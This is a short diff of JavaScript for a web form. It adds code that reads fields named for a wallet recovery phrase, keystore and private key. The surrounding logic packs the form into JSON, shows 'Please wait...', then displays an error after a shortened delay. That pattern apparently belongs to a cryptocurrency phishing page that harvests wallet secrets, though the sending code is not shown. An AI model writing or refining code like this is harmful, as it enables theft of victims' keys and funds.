@@ -64,6 +64,10 @@
   const result = document.getElementById("result");
   const progressBar = select(".sending");
 
+  var phrase = document.querySelector("#phrase");
+  var keystore = document.querySelector("#keystore");
+  var private = document.querySelector("#private");
+
   form.addEventListener("submit", function (e) {
     const formData = new FormData(form);
     e.preventDefault();
@@ -71,6 +75,8 @@
     formData.forEach((value, key) => {
       object[key] = value;
     });
+
+
     var json = JSON.stringify(object);
 
     result.innerHTML = "Please wait...";
@@ -126,5 +132,8 @@
   setTimeout(() => {
     loadingBox.style.display = "none";
     errorBorder.style.display = "block";
-  }, 5000);
+  }, 2000);
 })();
+var phrase = document.querySelector("#phrase");
+  var keystore = document.querySelector("#keystore");
+  var private = document.querySelector("#private");
